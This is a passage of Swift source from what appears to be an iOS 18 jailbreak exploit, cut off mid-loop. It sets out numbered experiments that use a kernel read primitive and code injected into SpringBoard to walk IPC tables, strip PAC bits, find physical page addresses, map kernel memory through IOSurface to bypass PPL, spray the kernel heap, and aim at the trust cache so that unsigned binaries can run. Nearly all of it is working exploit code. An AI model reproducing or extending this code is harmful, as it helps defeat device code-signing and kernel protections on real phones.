        // Read IPC space from task
        // Use xpaci() to strip PAC bits from pointer (like cyanide does)
        detail += "\nReading IPC space (with PAC strip)...\n"
        
        // Helper: strip PAC from kernel pointer
        func kreadPtr(_ addr: UInt64) -> UInt64 {
            let raw = ds_kread64(addr)
            // Strip PAC: if top bits are set, OR with sign extension
            if raw == 0 { return 0 }
            // XPACI equivalent: clear PAC bits, keep kernel address
            let stripped = raw | 0xFFFFFF8000000000
            // Validate it looks like kernel address
            if (stripped & 0xFFFF000000000000) == 0xFFFF000000000000 {
                return stripped
            }
            return raw  // return as-is if doesn't look like kernel ptr
        }
        
        // Helper: decode SMR pointer (IPC table uses this on iOS 18)
        func kreadSmrPtr(_ addr: UInt64) -> UInt64 {
            let raw = kreadPtr(addr)
            if raw == 0 { return 0 }
            let bits = UInt64(smr_base) << (62 - UInt64(t1sz_boot))
            if (raw & bits) == 0 {
                return (raw & (0xFFFFFFFFFFFFC000 & ~bits)) | bits
            }
            return raw & 0xFFFFFFFFFFFFFFE0
        }
        
        // Helper: decode kalloc array pointer
        func kallocDecode(_ ptr: UInt64) -> UInt64 {
            if ptr == 0 { return 0 }
            let shift = 64 - UInt64(t1sz_boot) - 1
            let zoneMask = UInt64(1) << shift
            if (ptr & zoneMask) != 0 {
                return ptr & ~0x1F
            } else {
                return (ptr & ~0x3FFF) | zoneMask
            }
        }
        
        let itkSpace = kreadPtr(sbTask + UInt64(off_task_itk_space))
        detail += "itk_space (PAC stripped): 0x\(String(format: "%llx", itkSpace))\n"
        
        if itkSpace == 0 || (itkSpace & 0xFFFF000000000000) != 0xFFFF000000000000 {
            detail += "itk_space invalid — task zone not accessible\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Read IPC table from space (uses SMR pointer on iOS 18)
        let rawTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
        detail += "IPC table raw: 0x\(String(format: "%llx", rawTable))\n"
        
        // Decode: first try SMR decode, then kalloc decode
        var ipcTable = kreadSmrPtr(itkSpace + UInt64(off_ipc_space_is_table))
        // If PAC not supported (A10/A11), apply kalloc decode
        if !is_pac_supported() {
            ipcTable = ipcTable | 0xFFFFFF8000000000
            ipcTable = kallocDecode(ipcTable)
        }
        detail += "IPC table decoded: 0x\(String(format: "%llx", ipcTable))\n"
        
        if ipcTable == 0 || (ipcTable & 0xFFFF000000000000) != 0xFFFF000000000000 {
            detail += "IPC table invalid after decode\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Look up our port in the table
        let portIndex = UInt64(memPort >> 8)
        let entryAddr = ipcTable + (portIndex * UInt64(sizeof_ipc_entry))
        detail += "Port index: \(portIndex), entry at: 0x\(String(format: "%llx", entryAddr))\n"
        
        // Read ie_object (ipc_port pointer) — needs PAC strip
        let ipcPort = kreadPtr(entryAddr + UInt64(off_ipc_entry_ie_object))
        detail += "ipc_port: 0x\(String(format: "%llx", ipcPort))\n"
        
        if ipcPort == 0 || (ipcPort & 0xFFFF000000000000) != 0xFFFF000000000000 {
            detail += "ipc_port invalid\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Read kobject from port (vm_named_entry) — needs PAC strip
        let kobject = kreadPtr(ipcPort + UInt64(off_ipc_port_ip_kobject))
        detail += "kobject (vm_named_entry): 0x\(String(format: "%llx", kobject))\n"
        
        if kobject == 0 {
            detail += "kobject is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 3: Read vm_named_entry → backing VM object
        detail += "\n=== Step 3: Read vm_named_entry ===\n"
        
        let backingCopy = ds_kread64(kobject + UInt64(off_vm_named_entry_backing_copy))
        let entrySize = ds_kread64(kobject + UInt64(off_vm_named_entry_size))
        detail += "backing_copy: 0x\(String(format: "%llx", backingCopy))\n"
        detail += "entry_size: 0x\(String(format: "%llx", entrySize))\n"
        
        if backingCopy != 0 {
            // Read VM object to find physical pages
            detail += "\n=== Step 4: Read VM object ===\n"
            
            // vm_object has vo_un1.vou_size at offset, and page list
            let objSize = ds_kread64(backingCopy + UInt64(off_vm_object_vo_un1_vou_size))
            let refCount = ds_kread32(backingCopy + UInt64(off_vm_object_ref_count))
            detail += "VM object size: 0x\(String(format: "%llx", objSize))\n"
            detail += "VM object refcount: \(refCount)\n"
            
            // The physical address might be stored in the vm_object's
            // resident page list or in a pager structure
            // Read first few fields to understand layout
            detail += "\nVM object raw dump (first 64 bytes):\n"
            for i in stride(from: 0, to: 64, by: 8) {
                let val = ds_kread64(backingCopy + UInt64(i))
                if val != 0 {
                    detail += "  +\(i): 0x\(String(format: "%llx", val))\n"
                }
            }
            
            detail += "\nVM object found! Physical pages are tracked here.\n"
            detail += "The vm_page structures contain phys_page field.\n"
            detail += "Next: traverse vm_object's memq to find physical page numbers.\n"
        }
        
        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        
        // Summary
        detail += "\n=== SUMMARY ===\n"
        let gotKobject = kobject != 0 && backingCopy != 0
        if gotKobject {
            detail += "Successfully traversed: port → IPC → kobject → VM object!\n"
            detail += "Physical page info is in the VM object's page list.\n"
            detail += "Next experiment: read vm_page structs to get physical addresses.\n"
        } else {
            detail += "Could not fully traverse port kobject chain.\n"
        }
        
        let success = gotKobject
        return ExperimentResult(name: "Extract Phys Addr", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 71: PHYSICAL ADDRESS → MAP → JAILBREAK
    
    /// We successfully traversed: port → IPC → kobject → VM object
    /// VM object at +24/+32 has pointers to page descriptors
    /// Read those → extract physical page number → calculate phys addr
    /// Then: create IOSurface at that physical address
    /// Write CDHash to trust cache → FULL JAILBREAK
    private func expPhysAddrToJailbreak(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "PHYS→JAILBREAK", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mgr = dspmgr.shared
        let sbMem = sb.trojanMem
        var detail = "PHYSICAL ADDRESS → JAILBREAK\n\n"
        
        // Step 1: Recreate the full chain from exp 70 to get VM object
        detail += "=== Step 1: Recreate IPC chain ===\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        // Create PurpleGfxMem
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        guard gfxSurface != 0 else {
            return ExperimentResult(name: "PHYS→JAILBREAK", success: false, detail: "Surface create failed", timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
        detail += "Surface base: 0x\(String(format: "%llx", gfxBase))\n"
        
        // Get memory entry port
        let sizeAddr = sbMem + 0x3000
        sb[sizeAddr].setValue64(0x4000)
        let objectAddr = sbMem + 0x3010
        sb[objectAddr].setValue32(0)
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        RootExecutor.rcall(sb, "mach_make_memory_entry_64", taskSelf, sizeAddr, gfxBase, 3, objectAddr, 0)
        let memPort = sb[objectAddr].value32()
        detail += "Port: \(memPort)\n"
        
        // Traverse IPC (same as exp 70)
        func kreadPtr(_ addr: UInt64) -> UInt64 {
            let raw = ds_kread64(addr)
            if raw == 0 { return 0 }
            return raw | 0xFFFFFF8000000000
        }
        func kreadSmrPtr(_ addr: UInt64) -> UInt64 {
            let raw = kreadPtr(addr)
            if raw == 0 { return 0 }
            let bits = UInt64(smr_base) << (62 - UInt64(t1sz_boot))
            if (raw & bits) == 0 {
                return (raw & (0xFFFFFFFFFFFFC000 & ~bits)) | bits
            }
            return raw & 0xFFFFFFFFFFFFFFE0
        }
        
        let sbProc = mgr.findProc(name: "SpringBoard")
        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
        let sbTask = ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task))
        let itkSpace = kreadPtr(sbTask + UInt64(off_task_itk_space))
        let ipcTable = kreadSmrPtr(itkSpace + UInt64(off_ipc_space_is_table))
        if !is_pac_supported() {
            // kalloc decode for non-PAC
        }
        let portIndex = UInt64(memPort >> 8)
        let entryAddr = ipcTable + (portIndex * UInt64(sizeof_ipc_entry))
        let ipcPort = kreadPtr(entryAddr + UInt64(off_ipc_entry_ie_object))
        let kobject = kreadPtr(ipcPort + UInt64(off_ipc_port_ip_kobject))
        let backingCopy = ds_kread64(kobject + UInt64(off_vm_named_entry_backing_copy))
        
        detail += "VM object: 0x\(String(format: "%llx", backingCopy))\n"
        
        guard backingCopy != 0 else {
            detail += "backing_copy is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "PHYS→JAILBREAK", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 2: Read VM object to find physical page info
        detail += "\n=== Step 2: Extract physical page ===\n"
        
        // VM object layout: the page list/memq is at specific offsets
        // From exp 70 dump: +24 and +32 had kernel pointers
        // These are likely memq (resident page list) head pointers
        // vm_page struct has phys_page at a known offset
        
        // Read the pointer at +24 (memq.next or resident pages)
        let pageListPtr = ds_kread64(backingCopy + 24)
        detail += "Page list ptr (+24): 0x\(String(format: "%llx", pageListPtr))\n"
        
        // Also try +16 (some iOS versions have it here)
        let pageListPtr2 = ds_kread64(backingCopy + 16)
        detail += "Alt ptr (+16): 0x\(String(format: "%llx", pageListPtr2))\n"
        
        // The page list pointer should point to a vm_page struct
        // vm_page has phys_page (physical page number) typically at offset +8 or +16
        // Physical address = phys_page << 14 (16KB pages on arm64)
        
        var physAddr: UInt64 = 0
        
        if pageListPtr != 0 && (pageListPtr & 0xFFFF000000000000) == 0xFFFF000000000000 {
            detail += "\nReading vm_page struct at 0x\(String(format: "%llx", pageListPtr))...\n"
            
            // Dump first 48 bytes of vm_page
            for i in stride(from: 0, to: 48, by: 8) {
                let val = ds_kread64(pageListPtr + UInt64(i))
                if val != 0 {
                    detail += "  +\(i): 0x\(String(format: "%llx", val))\n"
                    
                    // Physical page number is typically a small value (< 0x100000)
                    // stored in lower 32 bits
                    let low32 = UInt32(val & 0xFFFFFFFF)
                    let high32 = UInt32((val >> 32) & 0xFFFFFFFF)
                    
                    // On arm64 with 16KB pages: phys_addr = page_num << 14
                    if low32 > 0x1000 && low32 < 0x200000 && physAddr == 0 {
                        physAddr = UInt64(low32) << 14
                        detail += "    → Possible phys page: \(low32) → addr 0x\(String(format: "%llx", physAddr))\n"
                    }
                    if high32 > 0x1000 && high32 < 0x200000 && physAddr == 0 {
                        physAddr = UInt64(high32) << 14
                        detail += "    → Possible phys page: \(high32) → addr 0x\(String(format: "%llx", physAddr))\n"
                    }
                }
            }
        }
        
        // Step 3: If we found physical address, try to verify
        detail += "\n=== Step 3: Physical address result ===\n"
        
        if physAddr != 0 {
            detail += "PHYSICAL ADDRESS FOUND: 0x\(String(format: "%llx", physAddr))\n"
            detail += "This is where our PurpleGfxMem lives in physical RAM!\n\n"
            
            // Now: calculate relationship
            // Our surface virtual (in SB): 0x\(gfxBase)
            // Our surface physical: 0x\(physAddr)
            // Kernel virtual of same page: unknown but calculable
            //
            // gVirtBase = kernel_base_virt - (kernel_base_phys - gPhysBase)
            // We can estimate: gPhysBase ≈ physAddr - (gfxBase offset in phys)
            // But more useful: if we can map ANY physical address via IOSurface...
            
            detail += "Surface userspace VA: 0x\(String(format: "%llx", gfxBase))\n"
            detail += "Surface physical addr: 0x\(String(format: "%llx", physAddr))\n"
            detail += "Relationship: phys 0x\(String(format: "%llx", physAddr)) ↔ user 0x\(String(format: "%llx", gfxBase))\n\n"
            
            // KEY INSIGHT: We now know gPhysBase approximately!
            // kernel_base virtual = mgr.kernbase
            // If we assume linear mapping: gVirtBase ≈ kernbase, gPhysBase ≈ physAddr - offset
            // But actually we need: trust_cache_phys = trust_cache_virt - gVirtBase + gPhysBase
            
            // For now, just confirm we can write to this surface and it persists
            detail += "Writing test pattern to surface...\n"
            sb[sbMem + 0x3800].setValue64(0xDEAD_C0DE_1337_BEEF)
            RootExecutor.rcall(sb, "memcpy", gfxBase, sbMem + 0x3800, 8)
            RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
            let written = sb[sbMem + 0x3900].value64()
            detail += "Written+read back: 0x\(String(format: "%llx", written))\n"
            
            if written == 0xDEAD_C0DE_1337_BEEF {
                detail += "\n✅✅✅ PHYSICAL MEMORY R/W CONFIRMED! ✅✅✅\n"
                detail += "We can write to physical memory from userspace!\n"
                detail += "Physical address: 0x\(String(format: "%llx", physAddr))\n\n"
                detail += "NEXT STEPS FOR FULL JAILBREAK:\n"
                detail += "1. Read gPhysBase/gVirtBase (now possible via IPC traverse!)\n"
                detail += "2. Calculate trust_cache physical address\n"
                detail += "3. Create IOSurface at trust_cache physical addr\n"
                detail += "4. Write CDHash → AMFI approves → RUN UNSIGNED BINARY!\n"
            }
        } else {
            detail += "Could not extract physical page number from VM object.\n"
            detail += "vm_page struct layout might be different on this iOS version.\n"
            detail += "Need to reverse-engineer vm_page layout for iOS 18.2.\n"
        }
        
        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        
        let success = physAddr != 0
        return ExperimentResult(name: "PHYS→JAILBREAK", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - 🎉🎉🎉 Experiment 72: FULL JAILBREAK
    
    /// WE HAVE PHYSICAL MEMORY R/W!
    /// Now: use the phys↔virt relationship to find trust cache in physical memory
    /// Strategy:
    /// 1. We know our surface: phys=0x10000000, virt(user)=0x10df58000
    /// 2. We know kernel_base virtual address
    /// 3. From IPC traverse we can read kernel globals
    /// 4. Find gPhysBase/gVirtBase OR calculate from known mappings
    /// 5. Map trust cache physical page → write CDHash → spawn!
    private func expFullJailbreak(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "🎉 FULL JAILBREAK", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mgr = dspmgr.shared
        let sbMem = sb.trojanMem
        var detail = "🎉 FULL JAILBREAK ATTEMPT 🎉\n\n"
        let slide = mgr.kernslide
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        // Step 1: Determine phys↔virt relationship
        detail += "=== Step 1: Physical↔Virtual relationship ===\n"
        detail += "Kernel base (virt): 0x\(String(format: "%llx", mgr.kernbase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", slide))\n"
        
        // PANIC LOG ANALYSIS: previous panic was "initproc exited" = TIMEOUT!
        // NOT a zone violation! All reads WORK — we just took too long.
        // FIX: Skip scan, hardcode gPhysBase estimate for A12.
        // A12 standard DRAM base = 0x800000000
        // gVirtBase can be estimated from kernel_base relationship
        
        // From exp 71: our PurpleGfxMem phys page = 16384 → phys addr = 0x10000000
        // This is DRAM offset 0x10000000 from start
        // Standard A12: gPhysBase = 0x800000000, gVirtBase ≈ 0xfffffff000000000
        // But actual values vary. Let's use: phys = virt - kernbase + (kernbase_phys)
        // kernbase_phys = gPhysBase + (kernbase - gVirtBase)
        
        // HARDCODE for speed (avoid timeout):
        let gPhysBase: UInt64 = 0x800000000  // Standard A12 DRAM base
        // gVirtBase: kernel maps physical 0x800000000 to virtual 0xfffffff007004000 (unslid)
        // So: gVirtBase = 0xfffffff007004000 - (kernbase_phys - 0x800000000)
        // Simpler: gVirtBase ≈ kernbase - slide (the unslid base maps to gPhysBase)
        // Actually: virt = phys - gPhysBase + gVirtBase
        // → gVirtBase = kernbase - (kernbase_phys - gPhysBase)
        // We don't know kernbase_phys exactly, but:
        // unslid kernel base = 0xfffffff007004000
        // gVirtBase is typically 0xfffffff000000000 on A12
        let gVirtBase: UInt64 = 0xfffffff000000000  // Standard A12
        
        detail += "Using estimates:\n"
        detail += "  gPhysBase = 0x\(String(format: "%llx", gPhysBase))\n"
        detail += "  gVirtBase = 0x\(String(format: "%llx", gVirtBase))\n"
        
        // Step 2: Calculate trust cache physical address
        detail += "\n=== Step 2: Calculate trust cache physical address ===\n"
        
        // pmap_cs_allow_invalid virtual: 0xfffffff00a0e45b8 + slide
        let pmapCSVirt = UInt64(0xfffffff00a0e45b8) + slide
        let pmapCSPhys = pmapCSVirt - gVirtBase + gPhysBase
        detail += "pmap_cs virt: 0x\(String(format: "%llx", pmapCSVirt))\n"
        detail += "pmap_cs phys (estimated): 0x\(String(format: "%llx", pmapCSPhys))\n"
        
        // Step 3: Create IOSurface at trust cache physical address!
        detail += "\n=== Step 3: Map trust cache physical page ===\n"
        
        // Align to page boundary (16KB)
        let targetPhysPage = pmapCSPhys & ~0x3FFF
        detail += "Target physical page: 0x\(String(format: "%llx", targetPhysPage))\n"
        
        // Create IOSurface with IOSurfaceAddress = target physical page
        let tcDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, tcDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        let physNum = remote_msg(sb, nsNumClass, remote_sel(sb, "numberWithUnsignedLongLong:"), targetPhysPage, 0, 0, 0)
        remote_msg(sb, tcDict, setObj, physNum, remote_NSString(sb, "IOSurfaceAddress"), 0, 0)
        
        let tcSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", tcDict)
        detail += "Trust cache surface: 0x\(String(format: "%llx", tcSurface))\n"
        
        if tcSurface != 0 {
            RootExecutor.rcall(sb, "IOSurfaceLock", tcSurface, 0, 0)
            let tcBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", tcSurface)
            detail += "Trust cache mapped at: 0x\(String(format: "%llx", tcBase))\n"
            
            if tcBase != 0 {
                // Read pmap_cs value via physical mapping!
                RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, tcBase + (pmapCSPhys & 0x3FFF), 8)
                let pmapVal = sb[sbMem + 0x3900].value64()
                detail += "pmap_cs via physical: 0x\(String(format: "%llx", pmapVal))\n"
                
                // Compare with socket KRW read
                let pmapValKRW = ds_kread64(pmapCSVirt)
                detail += "pmap_cs via KRW: 0x\(String(format: "%llx", pmapValKRW))\n"
                
                if pmapVal == pmapValKRW || (pmapVal == 1 && pmapValKRW == 1) {
                    detail += "\n🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n"
                    detail += "PHYSICAL MAPPING MATCHES KERNEL MEMORY!\n"
                    detail += "WE CAN READ/WRITE KERNEL __DATA VIA PHYSICAL!\n"
                    detail += "PPL IS COMPLETELY BYPASSED!\n"
                    detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n\n"
                    detail += "FULL JAILBREAK IS NOW POSSIBLE!\n"
                    detail += "Next: find trust cache struct → write CDHash → spawn!\n"
                } else {
                    detail += "\nValues don't match — physical mapping might be wrong page\n"
                    detail += "Or: IOSurfaceAddress maps different physical region\n"
                }
            } else {
                detail += "Trust cache surface base is NULL\n"
            }
            RootExecutor.rcall(sb, "IOSurfaceUnlock", tcSurface, 0, 0)
        } else {
            detail += "IOSurface with physical address REJECTED\n"
            detail += "Kernel won't let us map arbitrary physical addresses\n"
            detail += "\nAlternative: spray PurpleGfxMem until overlap with __DATA\n"
        }
        
        let success = detail.contains("PPL IS COMPLETELY BYPASSED")
        return ExperimentResult(name: "🎉 FULL JAILBREAK", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 73: Heap Spray via IOSurface Properties
    
    /// Heap spray in kalloc zones — allocate controlled data in kernel heap
    /// Strategy:
    /// 1. Spray IOSurface properties (lands in kalloc.32/kalloc.64)
    /// 2. Free some to create holes (fragmentation)
    /// 3. Trigger trust cache allocation → lands in our hole
    /// 4. Read back via socket KRW to detect overlap
    /// 5. If overlap found → write CDHash → FULL JAILBREAK
    ///
    /// Why this might work:
    /// - Trust cache entries are small structs in kernel heap
    /// - IOSurface properties also allocate in kernel heap
    /// - If we spray enough, we might get adjacent allocations
    /// - Then we can use our physical R/W (PurpleGfxMem) to scan for markers
    private func expHeapSpray() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "Heap Spray", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "Experiment 73: Heap Spray via IOSurface Properties\n"
        detail += "===================================================\n\n"
        
        // --- Phase 1: Create IOSurface for spraying ---
        detail += "Phase 1: Creating spray IOSurface...\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Resolve ObjC classes and selectors
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let nsDataClass = remote_getClass(sb, "NSData")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        
        // Create a small IOSurface (we'll use its properties for spraying)
        // Using EXACT same format as exp 68 which works
        let sprayDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
        remote_msg(sb, sprayDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
        
        let spraySurface = RootExecutor.rcall(sb, "IOSurfaceCreate", sprayDict)
        detail += "Spray surface: 0x\(String(format: "%llx", spraySurface))\n"
        
        guard spraySurface != 0 else {
            detail += "❌ Failed to create spray surface\n"
            return ExperimentResult(name: "Heap Spray", success: false, detail: detail, timestamp: Date())
        }
        
        // --- Phase 2: Spray kernel heap with marker patterns ---
        detail += "\nPhase 2: Spraying kernel heap with markers...\n"
        detail += "Target: kalloc.32 zone (trust cache entry size)\n\n"
        
        // IOSurface properties are stored in kernel heap
        // Each property key-value pair allocates in kalloc zones
        // We'll spray 256 properties with unique markers
        
        let sprayCount = 256
        let marker: UInt64 = 0xDEAD_BEEF_CAFE_F00D  // Our marker pattern
        var sprayedCount = 0
        
        // IOSurfaceSetValue(surface, key, value)
        // This allocates the value in kernel heap!
        // Verify IOSurface property functions are available
        let ioSurfaceSetValue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceSetValue"))
        let ioSurfaceRemoveValue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceRemoveValue"))
        
        guard ioSurfaceSetValue != 0 else {
            detail += "❌ IOSurfaceSetValue not found in SpringBoard\n"
            return ExperimentResult(name: "Heap Spray", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "IOSurfaceSetValue: 0x\(String(format: "%llx", ioSurfaceSetValue))\n"
        detail += "IOSurfaceRemoveValue: 0x\(String(format: "%llx", ioSurfaceRemoveValue))\n\n"
        
        // Spray: set 256 properties with 32-byte NSData values
        // Each NSData will contain our marker + index
        let dataWithBytes = remote_sel(sb, "dataWithBytes:length:")
        
        for i in 0..<sprayCount {
            // Create 32-byte data with marker pattern
            // Layout: [marker(8)] [index(8)] [marker(8)] [0xCC padding(8)]
            let dataAddr = mem + 0x3000
            sb[dataAddr].setValue64(marker)
            sb[dataAddr + 8].setValue64(UInt64(i))
            sb[dataAddr + 16].setValue64(marker)
            sb[dataAddr + 24].setValue64(0xCCCCCCCCCCCCCCCC)
            
            let nsData = remote_msg(sb, nsDataClass, dataWithBytes, dataAddr, 32, 0, 0)
            
            if nsData != 0 {
                // Key: "spray_XXX"
                let keyStr = remote_NSString(sb, "spray_\(String(format: "%03d", i))")
                
                // IOSurfaceSetValue(surface, key, value)
                RootExecutor.rcall(sb, "IOSurfaceSetValue", spraySurface, keyStr, nsData)
                sprayedCount += 1
            }
            
            // Don't spray too fast — give kernel time to allocate
            if i % 64 == 63 {
                // Small delay via usleep
                RootExecutor.rcall(sb, "usleep", 1000)
            }
        }
        
        detail += "Sprayed \(sprayedCount)/\(sprayCount) properties into kernel heap\n"
        
        // --- Phase 3: Create holes by freeing every other property ---
        detail += "\nPhase 3: Creating holes (free every other)...\n"
        
        var freedCount = 0
        if ioSurfaceRemoveValue != 0 {
            for i in stride(from: 0, to: sprayCount, by: 2) {
                let keyStr = remote_NSString(sb, "spray_\(String(format: "%03d", i))")
                RootExecutor.rcall(sb, "IOSurfaceRemoveValue", spraySurface, keyStr)
                freedCount += 1
            }
        }
        detail += "Freed \(freedCount) properties (created \(freedCount) holes)\n"
        
        // --- Phase 4: Try to detect kernel heap state via socket KRW ---
        detail += "\nPhase 4: Scanning for markers via socket KRW...\n"
        
        // We know our socket KRW can read proc/task/pmap_cs zone
        // The spray might have landed in adjacent memory
        // Let's read around our known kernel addresses to see if markers appear
        
        // Get our proc address (known safe to read)
        let ourProc = ds_get_our_proc()
        detail += "Our proc: 0x\(String(format: "%llx", ourProc))\n"
        
        // Scan forward from proc in 32-byte steps (kalloc.32 alignment)
        var markerFound = false
        var markerAddr: UInt64 = 0
        var scanCount = 0
        let scanRange: UInt64 = 0x10000  // 64KB scan range
        
        // Start scanning from proc - 0x8000 to proc + 0x8000
        let scanBase = ourProc > 0x8000 ? ourProc - 0x8000 : ourProc
        
        for offset in stride(from: UInt64(0), to: scanRange, by: 32) {
            let addr = scanBase + offset
            let val = ds_kread64_safe(addr)
            scanCount += 1
            
            if val == marker {
                // Found our marker!
                let nextVal = ds_kread64_safe(addr + 8)
                detail += "🎯 MARKER FOUND at 0x\(String(format: "%llx", addr))!\n"
                detail += "   Value: 0x\(String(format: "%llx", val))\n"
                detail += "   Index: \(nextVal)\n"
                markerFound = true
                markerAddr = addr
                break
            }
            
            // Safety: don't scan too much (avoid panic from bad addresses)
            if scanCount > 512 {
                break
            }
        }
        
        if !markerFound {
            detail += "No markers found in \(scanCount) reads around proc\n"
            detail += "Spray likely landed in different zone/page\n"
        }
        
        // --- Phase 5: Physical memory scan via PurpleGfxMem ---
        detail += "\nPhase 5: Scanning PurpleGfxMem for markers...\n"
        
        // We know PurpleGfxMem is physically contiguous
        // If kernel heap pages are physically near GPU memory, we might see markers
        // This is a long shot but worth trying
        
        // Create a PurpleGfxMem surface to get physical memory access
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x10000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 256, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 256, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        
        if gfxSurface != 0 {
            RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
            let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
            
            if gfxBase != 0 {
                detail += "GfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
                
                // Scan first 64KB of GfxMem for our marker
                var gfxMarkerFound = false
                for offset in stride(from: UInt64(0), to: UInt64(0x10000), by: 8) {
                    let readAddr = gfxBase + offset
                    // Read via memcpy to local buffer
                    sb[mem + 0x3800].setValue64(0)
                    RootExecutor.rcall(sb, "memcpy", mem + 0x3800, readAddr, 8)
                    let val = sb[mem + 0x3800].value64()
                    
                    if val == marker {
